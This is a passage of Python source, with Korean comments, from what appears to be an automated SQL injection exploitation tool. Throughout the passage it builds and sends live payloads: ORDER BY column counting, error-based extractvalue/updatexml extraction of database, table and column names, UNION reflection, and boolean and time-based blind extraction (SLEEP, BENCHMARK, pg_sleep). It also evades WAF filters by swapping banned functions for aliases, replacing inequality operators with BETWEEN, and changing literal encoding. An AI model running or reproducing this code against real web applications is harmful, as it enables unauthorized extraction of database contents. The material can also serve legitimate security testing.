                    extract_found[label] = match.group(1)
                elif label == 'pg_cast':
                    match = re.search(r'invalid input syntax[^"]*"([^"]{1,128})"', body, re.IGNORECASE)
                    if match:
                        extract_found[label] = match.group(1)
        else:
            print(f"    [Enum] {vuln_entry['type']}로 탐지됨 — 에러 메시지가 화면에 안 뜨는 blind 유형이라 "
                  f"extractvalue 계열 시도는 스킵")

        # 유효 기준(ORDER BY 1)과 재정렬 흔들림 바닥(ORDER BY 1↔2 차이)을 잡는다. 둘 다 유효(= baseline과
        # 같은 상태코드, 본문 있음)일 때만 흔들림으로 인정하고, 아니면 0(에러 경계는 1자 차이로도 신호).
        ref_text = order_rows.get(1, (None, None, None))[1]
        ob2 = order_rows.get(2, (None, None, None))
        order_jitter = (diff_score(ref_text, ob2[1])
                        if ref_text is not None and ob2[1] is not None
                        and order_rows[1][0] == baseline_status and ob2[0] == baseline_status
                        else 0)

        union_col = None
        boundary_payload = None   # 컬럼 수가 깨지는 경계 지점의 실제 페이로드 — 사람이 그대로 붙여넣어 재현 가능
        prev_status_ok = True   # 직전 n까지는 baseline과 같은 상태코드였는지
        for n in sorted(order_rows):
            cur_status, cur_text, used_payload = order_rows[n]
            status_broke = cur_status is not None and cur_status != baseline_status and prev_status_ok
            # 본문 경계 — 유효 기준(ORDER BY 1)에서 재정렬 흔들림 이상으로 벗어나면 에러로 본다.
            diff_broke = (ref_text is not None and cur_text is not None
                          and self._separable(diff_score(ref_text, cur_text), order_jitter))
            if status_broke or diff_broke:
                union_col = n - 1 if n > 1 else None
                boundary_payload = used_payload
                break
            prev_status_ok = cur_status is None or cur_status == baseline_status
        print(f"    [Enum] ORDER BY 재정렬 흔들림={order_jitter} → col_count={union_col}")

        db_name_extracted = next(iter(extract_found.values()), None)

        # db명까지 뽑혔으면, 같은 함수로 테이블 1개 → 그 테이블의 컬럼 1개까지 이어서 확인해본다.
        table_name = column_name = None
        extract_label = 'mysql_extractvalue' if 'mysql_extractvalue' in extract_found else (
            'mysql_updatexml' if 'mysql_updatexml' in extract_found else None
        )
        if extract_label:
            fn = 'extractvalue' if extract_label == 'mysql_extractvalue' else 'updatexml'
            table_name = self._error_extract_value(
                surface, base_fields, injection_prefix, comment, fn,
                "(SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)",
                waf_hits, waf_evasions,
            )
            if table_name:
                column_name = self._error_extract_value(
                    surface, base_fields, injection_prefix, comment, fn,
                    f"(SELECT column_name FROM information_schema.columns WHERE table_name='{table_name}' LIMIT 1)",
                    waf_hits, waf_evasions,
                )
            print(f"    [Enum] error-based 추가 확인: table={table_name!r} column={column_name!r}")

        attack_vectors = {
            'error_based': (
                {
                    'possible':     True,
                    'db_name':      db_name_extracted,
                    'table_name':   table_name,
                    'column_name':  column_name,
                } if db_name_extracted
                else {'possible': False}
            ),
        }

        # UNION은 참/거짓을 추측하는 게 아니라 결과를 직접 반사시키는 방식이라 훨씬 신뢰도가 높다 —
        # 그래서 UNION을 먼저 시도하고, UNION으로 db명을 못 뽑았을 때만 blind 이진 탐색으로 넘어간다.
        # Boolean-based로 탐지됐다는 건 그 방식으로 처음 신호를 찾았다는 뜻이지 이 필드가 blind라는
        # 확정이 아니라, blind를 무조건 우선하지 않는다.
        if union_col:
            # UNION 추출 전에 방언을 확정한다 — _go_union_extract가 방언별로 다른 브랜치를 쓰기
            # 때문(MySQL: database()/information_schema, SQLite: sqlite_master, PostgreSQL:
            # current_database()). 확정된 boolean 오라클로 판별하며, 아직 방언이 없을 때만 한다
            # (숫자형 경로는 이미 detected_db를 채워둠). 판별 실패 시에도 UNION은 기본(MySQL)
            # 브랜치로 시도하고, 성공한 브랜치를 _go_union_extract가 detected_db에 기록한다.
            if vuln_entry.get('detected_db') in (None, 'Unknown'):
                self._resolve_dialect_for_union(surface, base_fields, injection_prefix, comment,
                                                 vuln_entry, waf_hits, waf_evasions)
            attack_vectors['UNION'] = {'possible': True, 'columns': union_col, 'order_by_payload': boundary_payload}
            vuln_entry['attack_vectors'] = attack_vectors
            self._go_union_reflect(surface, base_fields, union_col, comment, vuln_entry,
                                    injection_prefix, waf_hits, waf_evasions)
        else:
            attack_vectors['UNION'] = {'possible': False}
            vuln_entry['attack_vectors'] = attack_vectors

        # blind로 넘어갈지는 처음에 어떤 방식으로 탐지됐는지(vuln_entry['type'])가 아니라, 지금까지
        # 확보한 추출 수단이 있는지로 판단한다 — Error-based(상태코드뿐)로 확정된 경우도 UNION/error-based
        # 둘 다 실패했으면 마지막 수단으로 blind를 시도할 가치가 있다. _blind_extract_boolean 자체가
        # 캘리브레이션에서 신호 없으면 요청 2개만 쓰고 포기하니 비용이 낮다.
        union_db_name = attack_vectors['UNION'].get('db_name')
        if not union_db_name and not db_name_extracted:
            print(f"    [Enum] UNION/error-based 둘 다 db명을 못 뽑음 — blind 이진 탐색으로 대체 시도")
            # detected_db가 아래에서 방언으로 덮일 수 있으니 시간 프로필 조회는 먼저 해둔다.
            time_profile = self._TIME_PROFILE.get(vuln_entry.get('detected_db') or '')
            blind_db_name = blind_dialect = None
            if stateful:
                # 본문이 상태(카운터/리셋) 때문에 흔들리는 stateful 타깃에선 content 오라클을
                # 못 믿는다 — 아예 건너뛰고 상태와 무관한 시간 오라클(물리 지연)만 쓴다.
                print(f"    [Enum] stateful 타깃 — content 기반 blind는 신뢰 불가라 스킵, 시간 기반만 시도")
            else:
                # content(본문 diff) 기반 blind — 이미 확정된 진짜 방언(fingerprint/error)이 있으면
                # 재사용하되, time-based 변형 이름(MySQL_OR_BENCHMARK)은 SQL_DIALECTS에 없어 _resolve_dialect가
                # 다시 판별한다. 억지로 방언을 주입하면 못 믿을 content 오라클로 가짜 데이터를 뽑을
                # 위험이 있어 detected_db를 그대로 넘긴다.
                blind_db_name, blind_dialect = self._blind_extract_boolean(
                    surface, base_fields, injection_prefix, comment, None, waf_hits, waf_evasions,
                    known_db=vuln_entry.get('detected_db'),
                )
                if blind_dialect:
                    vuln_entry['detected_db'] = blind_dialect
                attack_vectors['blind_boolean'] = (
                    {'possible': True, 'db_name': blind_db_name} if blind_db_name
                    else {'possible': bool(blind_dialect), 'dialect': blind_dialect}
                )
            # content 기반이 db명을 못 뽑았거나(순수 time-based 등) stateful이라 아예 안 했고,
            # 시간 프로필이 있으면 시간 오라클로 추출을 시도한다 — 상태/필터에 흔들리지 않는 유일한 경로.
            if not blind_db_name and time_profile:
                reason = 'stateful' if stateful else 'content 기반 blind로는 db명 추출 실패'
                print(f"    [Enum] {reason} — 시간 기반 이진 탐색으로 시도")
                t_db_name, t_dialect = self._blind_extract_time(
                    surface, base_fields, injection_prefix, comment, None, time_profile,
                    vuln_entry.get('attack_time'), waf_hits, waf_evasions,
                )
                attack_vectors['blind_time'] = (
                    {'possible': True, 'db_name': t_db_name} if t_db_name
                    else {'possible': bool(t_dialect), 'dialect': t_dialect}
                )
        else:
            print(f"    [Enum] UNION 또는 error-based로 이미 db명 확보됨 — blind 이진 탐색은 생략")

    def _error_extract_value(self, surface, base_fields, injection_prefix: str, comment: str, fn: str, expr: str,
                              waf_hits: list, waf_evasions: list) -> str | None:
        """extractvalue/updatexml로 expr 값 하나를 뽑아본다 (테이블/컬럼 열거에 재사용)."""
        if fn == 'updatexml':
            inner = f"updatexml(1,concat(0x7e,{expr}),1)"
        else:
            inner = f"extractvalue(1,concat(0x7e,{expr}))"
        payload = f"{injection_prefix} AND {inner} {comment} "
        status, body, _, _, _ = self._send_evading(
            surface, base_fields, payload, f'enum(extract:{expr[:20]})', waf_hits, waf_evasions,
        )
        if status is None:
            return None
        match = re.search(r'~([^<\s\'"&]{1,64})', body)
        return match.group(1) if match else None

    # ── Blind(Boolean) 이진 탐색 추출 ─────────────────────────────────────────

    def _bool_oracle(self, surface, base_fields, injection_prefix: str, comment: str, condition: str,
                      ref_true_text: str, ref_false_text: str, waf_hits: list, waf_evasions: list,
                      dialect: str | None = None) -> bool | None:
        """condition(SQL 불리언 식)이 참인지, 캘리브레이션한 참/거짓 응답 텍스트에 더 가까운 쪽으로 판정한다."""
        payload = f"{injection_prefix} OR ({condition}) LIMIT 1 {comment} "
        status, body, _, _, _ = self._send_evading(
            surface, base_fields, payload, 'blind(oracle)', waf_hits, waf_evasions, dialect=dialect,
        )
        if status is None:
            return None
        text = visible_text(body)
        return diff_score(text, ref_true_text) <= diff_score(text, ref_false_text)

    @staticmethod
    def _binary_search(test_fn, lo: int, hi: int) -> int | None:
        """test_fn(n) = '실제값 > n' 오라클. [lo,hi] 안의 정확한 값을 찾는다."""
        while lo < hi:
            mid = (lo + hi) // 2
            result = test_fn(mid)
            if result is None:
                return None
            if result:
                lo = mid + 1
            else:
                hi = mid
        return lo

    def _uses_inequality_ban(self, surface) -> bool:
        """이 필드에서 '<' 또는 '>'가 밴이면 True — 비교식을 부등호 없이(BETWEEN 등) 만들어야 한다."""
        banned = self._banned_tokens.get((surface.url, surface.param))
        return bool(banned) and ('<' in banned or '>' in banned)

    def _cmp_gt(self, surface, lhs: str, n: int) -> str:
        """'lhs > n'(lhs는 음수 아님: LENGTH/ASCII)을 밴-안전하게 만든다. '<'/'>'가 밴이면
        부등호 없이 BETWEEN으로 — 'x > n' ⟺ 'x BETWEEN n+1 AND MAX'."""
        if self._uses_inequality_ban(surface):
            return f"{lhs} BETWEEN {n + 1} AND {self.BLIND_MAX_INT}"
        return f"{lhs}>{n}"

    def _cmp_always(self, surface, lhs: str, truth: bool) -> str:
        """정합성 앵커용 항상참/항상거짓 비교식. '<'/'>'가 밴이면 BETWEEN으로 — 항상참=
        'x BETWEEN 0 AND MAX'(음수 아님이라 항상 성립), 항상거짓='x BETWEEN 1 AND 0'(빈 범위)."""
        if self._uses_inequality_ban(surface):
            return f"{lhs} BETWEEN 0 AND {self.BLIND_MAX_INT}" if truth else f"{lhs} BETWEEN 1 AND 0"
        return f"{lhs}>=0" if truth else f"{lhs}<0"

    def _substr_expr(self, surface, dialect: str, x: str, pos: int, length: int) -> str:
        """부분문자열 함수를 밴 안 걸리는 별칭으로 고른다 — MySQL은 SUBSTR/SUBSTRING/MID가 동작이
        같아 substring이 밴이면 SUBSTR, 그것도 밴이면 MID로 넘어간다. 함수 이름만 밴 여부를 보므로
        (인자 x 안의 밴 토큰은 별개) 정확히 고른다."""
        if dialect == 'MySQL':
            for fn in ('SUBSTR', 'SUBSTRING', 'MID'):
                if self._banned_in(surface, fn) is None:
                    return f"{fn}({x},{pos},{length})"
        return SQL_DIALECTS[dialect]['substr_fn'](x, pos, length)

    def _ord_expr(self, surface, dialect: str, x: str) -> str:
        """문자→코드 함수를 밴 안 걸리는 별칭으로 — MySQL은 ASCII/ORD가 (ASCII 범위에서) 동일.
        ascii가 밴이면 ORD로 넘어간다."""
        if dialect == 'MySQL':
            for fn in ('ASCII', 'ORD'):
                if self._banned_in(surface, fn) is None:
                    return f"{fn}({x})"
        return SQL_DIALECTS[dialect]['ord_fn'](x)

    def _oracle_live(self, surface, oracle, probe_lhs: str, label: str) -> bool:
        """정합성 앵커 — 조건이 거짓이라 신호가 없는 것과, 우리 주입이 애초에 SQL에서 실행조차 안 돼
        (밴 토큰/문법오류/상태리셋) 신호가 없는 것을 구분한다.

        probe_lhs는 실제 판독의 좌변(예: LENGTH(database()), ASCII(SUBSTR(pw,1,1)))이라 실제 페이로드와
        밴/실행 노출이 동일하다. LENGTH()/ASCII()류는 음수가 안 나오므로 >=0은 항상 참, <0은 항상 거짓
        — 결과가 수학적으로 확정돼 있다. 항상참이 참 신호를, 항상거짓이 거짓 신호를 둘 다 낼 때만 채널이
        살아있다고 본다. probe_lhs에 밴 토큰(예: database)이 섞여 필터되면 >=0조차 참 신호를 못 내(양쪽
        다 거부 페이지로 뭉갬) 여기서 걸린다. 대상이 NULL인 경우(>=0이 NULL→falsy)도 함께 걸리는데,
        NULL이든 밴이든 못 뽑는 건 같아 가짜 값을 만들지 않고 정직하게 중단하는 게 맞다."""
        cond_true  = self._cmp_always(surface, probe_lhs, True)   # 항상 참 ('>' 밴이면 BETWEEN)
        cond_false = self._cmp_always(surface, probe_lhs, False)  # 항상 거짓
        always_true  = oracle(cond_true)
        always_false = oracle(cond_false)
        live = (always_true is True and always_false is False)
        if not live:
            print(f"    [{label}] 정합성 앵커 실패 ({cond_true} → {always_true}, {cond_false} → {always_false}) "
                  f"— 밴 토큰/문법오류/상태리셋으로 SQL 미실행으로 보고 측정 불가 처리(거짓 오판 안 함)")
        return live

    def _extract_with_oracle(self, surface, oracle, dialect: str, expr: str | None, label: str) -> str | None:
        """oracle(condition)->bool|None + 이진 탐색으로 expr 값을 문자 단위로 추출한다.

        content 오라클(_bool_oracle)이든 시간 오라클(_time_oracle)이든 이 SQL 불리언 조건이 참인가만
        답하면 되므로, 길이·문자 이진 탐색 로직은 오라클 종류와 무관하게 공용이다. expr=None이면 그
        방언의 current_db 표현식을 뽑는다(current_db 개념이 없는 방언이면 None). 문자 추출엔 방언별
        ord_fn/substr_fn을 쓴다.
        """
        d = SQL_DIALECTS[dialect]
        if expr is None:
            if d['current_db'] is None:
                print(f"    [{label}] {dialect}는 현재 DB명 개념이 없어 추출 스킵 (방언만 확인됨)")
                return None
            expr = d['current_db']

        # 정합성 앵커 — 첫 길이 판독을 믿기 전에, 같은 좌변으로 이 페이로드가 실제로 SQL에서
        # 실행되는지 확인한다. 실패하면 이후 거짓 판독이 전부 밴/미실행일 수 있어 신뢰 불가
        # → 여기서 중단한다(가짜 길이 0 방지).
        if not self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
            return None

        length = self._binary_search(lambda n: oracle(self._cmp_gt(surface, f"LENGTH({expr})", n)), 0, self.BLIND_MAX_LEN)
        if length is None:
            print(f"    [{label}] {expr} 길이 확인 실패 (요청 실패)")
            return None
        if length == 0:
            # 시작 앵커는 통과했으니 원래는 진짜 빈 값이지만, 추출 도중 상태가 리셋돼 채널이
            # 죽었을 수도 있다 — 앵커를 다시 찍어 진짜 빈 값과 도중 死를 가른다.
            if self._oracle_live(surface, oracle, f"LENGTH({expr})", label):
                print(f"    [{label}] {expr} 길이=0 (빈 값 — 앵커 재확인 통과)")
            else:
                print(f"    [{label}] {expr} 길이가 0으로 붕괴 + 앵커 재확인 실패 — 추출 도중 오라클 死"
                      f"(필터/상태리셋 추정), 측정 불가")
            return None
        if length >= self.BLIND_MAX_LEN:
            # 상한까지 꽉 찼다는 건 오라클이 거의 항상 '참'으로 판정 중이라는 뜻 — 진짜 64자
            # 식별자일 리 없으니 오라클/캘리브레이션 불안정으로 보고 중단한다(무한정 헛도는 것 방지).
            print(f"    [{label}] {expr} 길이가 상한({self.BLIND_MAX_LEN})까지 도달 — 오라클이 불안정한 것으로 "
                  f"보여 추출 중단 (수동 확인 권장)")
            return None
        print(f"    [{label}] {expr} 길이={length}")

        result = ''
        for pos in range(1, length + 1):
            char_expr = self._ord_expr(surface, dialect, self._substr_expr(surface, dialect, expr, pos, 1))
            # 8글자마다 채널이 아직 살아있는지 재확인 — 추출 도중 상태리셋/밴으로 오라클이 죽으면
            # 이후 글자가 전부 쓰레기(charset 최소값 등)로 채워지는 걸 막고 여기까지만 반환한다.
            if pos > 1 and (pos - 1) % 8 == 0 and not self._oracle_live(surface, oracle, char_expr, label):
                print(f"    [{label}] {pos}번째 글자 직전 앵커 실패 — 추출 도중 오라클 死, 여기까지만: {result!r}")
                return result or None
            idx = self._binary_search(lambda i: oracle(self._cmp_gt(surface, char_expr, self.BLIND_CHARSET[i])),
                                       0, len(self.BLIND_CHARSET) - 1)
            if idx is None:
                print(f"    [{label}] {pos}번째 글자 확인 실패 — 여기까지만 추출: {result!r}")
                return result or None
            ch = chr(self.BLIND_CHARSET[idx])
            result += ch
            print(f"    [{label}] {pos}/{length}: {ch!r} → {result!r}")
        return result

    def _resolve_dialect(self, surface, base_fields, injection_prefix: str, comment: str,
                          ref_true_text: str, ref_false_text: str,
                          waf_hits: list, waf_evasions: list,
                          known_db: str | None = None) -> str | None:
        """에러 메시지도 안 보이고 SLEEP도 못 쓰는(또는 아직 안 한) blind 상황에서, 참/거짓 오라클만으로
        DB 방언(SQLite/MySQL/PostgreSQL)을 알아낸다.

        known_db(이미 채워진 detected_db — 숫자형 경로의 dialect 판별, _resolve_dialect_for_union의 사전
        판별, 또는 UNION 추출 성공 시 기록된 값)가 SQL_DIALECTS에 있는 이름이면 그대로 재사용하고 요청을
        안 보낸다 — 이미 판별이 끝난 필드는 다시 물을 필요가 없다. 없거나 우리 방언 테이블에 없는 값
        (Unknown/MSSQL/Oracle)이면 직접 프로빙한다.

        각 방언의 version_fn으로 항상 참/항상 거짓 조건을 만들어 실제로 참/거짓이 갈리는지 본다 — 방언이
        틀리면 그 함수가 없어 쿼리가 깨져 두 probe가 같은 에러 응답으로 뭉개지고, 맞으면 참/거짓이 정상적으로
        갈린다. 필드당 한 번만 하고 결과를 캐싱한다.
        """
        key = (surface.url, surface.param)
        cached = self._dialect_cache.get(key)
        if cached:
            return cached

        if known_db:
            clean = known_db.replace(' (추정)', '').strip()
            if clean in SQL_DIALECTS:
                print(f"    [Blind] 방언 판별: {clean} (이미 확정된 detected_db 재사용, 추가 요청 없음)")
                self._dialect_cache[key] = clean
                return clean

        for dialect in DIALECT_PROBE_ORDER:
            version_fn = SQL_DIALECTS[dialect]['version_fn']
            is_true = self._bool_oracle(
                surface, base_fields, injection_prefix, comment, self._cmp_gt(surface, f"LENGTH({version_fn})", 0),
                ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
            )
            is_false = self._bool_oracle(
                surface, base_fields, injection_prefix, comment, self._cmp_gt(surface, f"LENGTH({version_fn})", 99999),
                ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
            )
            if is_true is True and is_false is False:
                print(f"    [Blind] 방언 판별: {dialect} (참/거짓 오라클로 확인)")
                self._dialect_cache[key] = dialect
                return dialect
        print(f"    [Blind] 방언 판별 실패 — SQLite/MySQL/PostgreSQL 중 어느 것도 안 맞음")
        return None

    def _resolve_dialect_for_union(self, surface, base_fields, injection_prefix: str, comment: str,
                                    vuln_entry: dict, waf_hits: list, waf_evasions: list) -> None:
        """UNION 추출 직전에 방언을 확정해 vuln_entry['detected_db']에 채운다. _blind_extract_boolean과
        똑같이 OR (1=1)/(1=2)로 기준 텍스트를 잡고 참을 한 번 더 보내 같은조건 흔들림(jitter)을 재,
        참↔거짓 간격이 그 흔들림보다 확실히 클 때만(_separable) _resolve_dialect로 판별하고, 아니면 조용히
        넘어간다(UNION은 기본 브랜치로 시도 → 성공 브랜치를 _go_union_extract가 기록). blind로 넘어가는
        경우 _resolve_dialect 캐시를 그대로 재사용한다."""
        t_status, t_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true)', waf_hits, waf_evasions,
        )
        t2_status, t2_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'dialect(calib-true2)', waf_hits, waf_evasions,
        )
        f_status, f_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'dialect(calib-false)', waf_hits, waf_evasions,
        )
        if t_status is None or t2_status is None or f_status is None:
            return
        ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
        jitter = diff_score(ref_true_text, visible_text(t2_body))
        if not self._separable(diff_score(ref_true_text, ref_false_text), jitter):
            return  # content 오라클 미성립 — UNION 기본 브랜치로 두고 방언 판별 스킵
        dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
                                         ref_true_text, ref_false_text, waf_hits, waf_evasions,
                                         known_db=vuln_entry.get('detected_db'))
        if dialect:
            vuln_entry['detected_db'] = dialect

    def _blind_extract_boolean(self, surface, base_fields, injection_prefix: str, comment: str, expr: str | None,
                                waf_hits: list, waf_evasions: list,
                                known_db: str | None = None) -> tuple[str | None, str | None]:
        """참/거짓 오라클 + 이진 탐색으로 expr 값을 문자 단위로 뽑아낸다.

        expr=None이면 현재 DB명을 뽑으라는 뜻으로 해석한다 — 캘리브레이션 직후 DB 방언
        (SQLite/MySQL/PostgreSQL)을 먼저 판별해, 그 방언의 current_db 표현식을 찾아 쓴다. SQLite처럼
        현재 DB명 개념이 없는 방언이면 방언만 확정하고 이 단계는 스킵한다(추출값 None, 방언은 반환).
        expr에 구체적 SQL 표현식을 직접 넘기면 그대로 쓰되, 문자 추출엔 판별된 방언의 ord_fn/substr_fn을 쓴다.

        known_db는 그대로 _resolve_dialect에 넘겨서, 이미 확정된 DB가 있으면 재프로빙을
        건너뛴다.

        반환값: (추출된 문자열 또는 None, 판별된 DB 방언 이름 또는 None).
        """
        # 캘리브레이션 — 항상 참/거짓인 상수 조건으로 기준 텍스트를 잡고, 참을 한 번 더 보내 같은
        # 조건끼리의 흔들림(jitter)을 잰다. 참↔거짓 간격이 그 흔들림보다 확실히 커야(_separable)
        # content 오라클을 신뢰한다 — 절대 노이즈 상수 대신 같은 조건 응답으로 바닥을 in-context로 잡는다.
        t_status, t_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'blind(calib-true)', waf_hits, waf_evasions,
        )
        t2_status, t2_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=1) LIMIT 1 {comment} ", 'blind(calib-true2)', waf_hits, waf_evasions,
        )
        f_status, f_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix} OR (1=2) LIMIT 1 {comment} ", 'blind(calib-false)', waf_hits, waf_evasions,
        )
        if t_status is None or t2_status is None or f_status is None:
            return None, None
        ref_true_text, ref_false_text = visible_text(t_body), visible_text(f_body)
        jitter = diff_score(ref_true_text, visible_text(t2_body))
        calib_diff = diff_score(ref_true_text, ref_false_text)
        if not self._separable(calib_diff, jitter):
            print(f"    [Blind] 캘리브레이션 실패 — 참↔거짓 간격 {calib_diff}자가 같은조건 흔들림 {jitter}자를 "
                  f"충분히 못 넘어 추출 신뢰 불가")
            return None, None
        print(f"    [Blind] 캘리브레이션: 참↔거짓 간격={calib_diff}자, 같은조건 흔들림={jitter}자")

        dialect = self._resolve_dialect(surface, base_fields, injection_prefix, comment,
                                         ref_true_text, ref_false_text, waf_hits, waf_evasions,
                                         known_db=known_db)
        if dialect is None:
            return None, None
        oracle = lambda cond: self._bool_oracle(
            surface, base_fields, injection_prefix, comment, cond,
            ref_true_text, ref_false_text, waf_hits, waf_evasions, dialect=dialect,
        )
        result = self._extract_with_oracle(surface, oracle, dialect, expr, 'Blind')
        return result, dialect

    # ── Blind(Time) 이진 탐색 추출 ────────────────────────────────────────────

    @staticmethod
    def _timed_expr(timefn: str, seconds: int, benchmark_n: int, run: bool) -> str:
        """run=True면 지연을, False면 즉시(0) 반환하는 표현식을 만든다. benchmark는 SLEEP
        같은 지연 함수를 막는 필터를 CPU 반복 연산으로 우회한다(SLEEP은 무력화되고 BENCHMARK만
        통과하는 타깃을 겨냥한 대안)."""
        if timefn == 'sleep':
            return f"SLEEP({seconds})" if run else "0"
        if timefn == 'benchmark':
            return f"BENCHMARK({benchmark_n},MD5(1))" if run else "0"
        if timefn == 'pg_sleep':
            return f"pg_sleep({seconds})" if run else "pg_sleep(0)"
        return "0"

    def _time_oracle(self, surface, base_fields, injection_prefix: str, comment: str, condition: str,
                     profile: tuple, seconds: int, benchmark_n: int, threshold: float,
                     waf_hits: list, waf_evasions: list) -> bool | None:
        """condition이 참일 때만 DB가 지연되도록(IF/CASE로 지연함수를 조건부 실행) 만들어, 응답 시간으로
        참/거짓을 판정한다 — 본문이 필터로만 갈려 content 오라클을 못 쓰는 순수 time-based에서 유일한
        추출 수단.

        중요(무행/side-effect-free): 오라클 페이로드는 절대 행을 반환하면 안 된다. 로그인 폼 WHERE에
        OR (SELECT 1 ...)처럼 참이 되는 값을 넣으면 행이 반환돼, 앱이 로그인 성공 처리(리셋/잠금/로깅)나
        심지어 데이터 변경 같은 부작용을 낼 수 있다. BENCHMARK/SLEEP은 둘 다 0을 반환하므로 IF(cond, 지연, 0)의
        값은 항상 0이다. 이를 파생 테이블 (SELECT IF(...))x로 감싸 한 번만 materialize하고(행마다 반복 평가
        방지 — 맨 스칼라로 넣으면 행 수만큼 곱해져 타임아웃), 바깥을 SELECT 0으로 해 값 0 → OR 0이라 행을
        반환하지 않게 한다. 관찰되는 건 지연뿐. 반환: 지연됨(참)/안 됨(거짓)/요청 실패(None)."""
        dialect, conn, timefn = profile
        run_expr  = self._timed_expr(timefn, seconds, benchmark_n, True)
        zero_expr = self._timed_expr(timefn, seconds, benchmark_n, False)
        if dialect == 'PostgreSQL':
            # (미검증) pg_sleep은 void 반환이라 무행(값 0)으로 만들기 까다로워 기존 형태 유지.
            inner = f"CASE WHEN ({condition}) THEN {run_expr} ELSE {zero_expr} END"
            payload = f"{injection_prefix} {conn} (SELECT 1 FROM (SELECT {inner})x) {comment} "
        else:  # MySQL — 파생 테이블(run-once) + SELECT 0(무행): 'OR 0' → 행 미반환, 지연 1회
            body_expr = f"(SELECT 0 FROM (SELECT IF(({condition}),{run_expr},{zero_expr}))x)"
            payload = f"{injection_prefix} {conn} {body_expr} {comment} "
        status, _, elapsed, _, _ = self._send_evading(
            surface, base_fields, payload, 'blind-time(oracle)', waf_hits, waf_evasions,
            timeout=self.TIME_TIMEOUT, dialect=dialect,
        )
        if status is None:
            return None
        return elapsed >= threshold

    def _blind_extract_time(self, surface, base_fields, injection_prefix: str, comment: str, expr: str | None,
                             profile: tuple, attack_time: float | None,
                             waf_hits: list, waf_evasions: list) -> tuple[str | None, str | None]:
        """시간 오라클 + 이진 탐색으로 expr 값을 문자 단위로 뽑는다. content가 안 통하는 순수
        time-based용. profile=(방언, 연결어, 시간함수) — time 탐지가 이미 확정한 값이라 방언
        재판별이 필요 없다.

        반환: (추출 문자열 또는 None, 방언 이름)."""
        dialect, conn, timefn = profile
        if dialect not in SQL_DIALECTS:
            print(f"    [Blind-Time] {dialect}는 문자 추출 방언 테이블(SQL_DIALECTS)에 없어 시간 기반 추출 미지원")
            return None, dialect

        seconds = 2
        # benchmark는 걸리는 시간이 N·CPU 속도에 좌우된다 — 탐지 때 측정된 지연(attack_time)으로
        # N을 역산해, TRUE 한 번이 대략 seconds초가 되게 맞춘다(너무 길면 문자당 수 초라 하세월).
        benchmark_n = 20000000
        if timefn == 'benchmark' and attack_time and attack_time > 0.5:
            benchmark_n = max(2000000, int(20000000 * seconds / attack_time))

        base_times = []
        for _ in range(2):
            st, _, el = self._send(surface, dict(base_fields), timeout=self.TIME_TIMEOUT)
            if st is not None:
                base_times.append(el)
        baseline = sum(base_times) / len(base_times) if base_times else 0.3
        threshold = baseline + max(1.0, seconds * 0.5)

        def _oracle(cond):
            return self._time_oracle(surface, base_fields, injection_prefix, comment, cond,
                                     profile, seconds, benchmark_n, threshold, waf_hits, waf_evasions)

        # 캘리브레이션 — 항상참(1=1)은 지연되고 항상거짓(1=2)은 정상이어야 시간 오라클을 신뢰한다.
        slow = _oracle('1=1')
        fast = _oracle('1=2')
        if slow is not True or fast is not False:
            print(f"    [Blind-Time] 시간 오라클 캘리브레이션 실패 (1=1 지연?={slow}, 1=2 정상?={fast}) — 추출 불가")
            return None, dialect
        print(f"    [Blind-Time] 캘리브레이션 OK — baseline≈{baseline:.2f}s, threshold={threshold:.2f}s, "
              f"지연식={self._timed_expr(timefn, seconds, benchmark_n, True)}")

        result = self._extract_with_oracle(surface, _oracle, dialect, expr, 'Blind-Time')
        return result, dialect

    @staticmethod
    def _dialect_bytes_literal(dialect: str | None, raw: bytes) -> str:
        """방언에 안전하게 raw 바이트열을 나타내는 SQL 표현식을 만든다.

        MySQL은 0x{hex}(hex 문자열 리터럴)가 그 자체로 문자열 취급이라 그대로 쓰면 되지만, SQLite에서
        0x...는 16진수 정수 리터럴이라(||로 이어붙이면 10진수 텍스트가 돼 원하는 바이트가 안 나옴)
        char()로 문자 코드를 직접 만들어야 한다.

        SQLite의 char()는 원래 char(a,b,c,...)처럼 여러 코드를 한 번에 받지만, 일부러 한 글자씩
        (char(a), char(b), ...) 나눠 ||로 체이닝한다 — 콤마 자체를 필터링하는 사이트(함수 인자 사이
        콤마까지 막힘)에서는 char(a,b,c) 안의 콤마조차 걸리기 때문이다. PostgreSQL의 chr()는 애초에 한
        글자만 받아 원래도 이 방식이 필요했다 — 두 방언을 같은 로직으로 통일한다. dialect가 안 정해졌으면
        기존 동작(MySQL hex 리터럴)을 유지한다.
        """
        clean = (dialect or '').replace(' (추정)', '').strip()
        if clean == 'SQLite':
            return '||'.join(f"char({b})" for b in raw)
        if clean == 'PostgreSQL':
            return '||'.join(f"chr({b})" for b in raw)
        return f"0x{raw.hex()}"

    @staticmethod
    def _dialect_concat(dialect: str | None, parts: list[str]) -> str:
        """방언에 맞게 여러 SQL 표현식 조각을 문자열로 이어붙이는 식을 만든다.

        MySQL의 CONCAT()은 가변 인자라 그대로 넣으면 되지만, SQLite/PostgreSQL은 (구버전
        호환을 위해 CONCAT() 대신) 어디서나 되는 ||로 체이닝한다. dialect가 안 정해졌으면
        기존 동작(MySQL CONCAT)을 그대로 유지한다.
        """
        clean = (dialect or '').replace(' (추정)', '').strip()
        if clean in ('SQLite', 'PostgreSQL'):
            return '||'.join(parts)
        return f"CONCAT({','.join(parts)})"

    def _go_union_reflect(self, surface, base_fields, col_count, comment, vuln_entry: dict,
                           injection_prefix: str, waf_hits: list, waf_evasions: list) -> None:
        """각 컬럼 위치에 마커를 넣어 어느 컬럼이 화면에 반사되는지 찾는다.

        마커를 리터럴 문자열로 그냥 박으면, 입력받은 쿼리 원문을 디버깅용으로 그대로
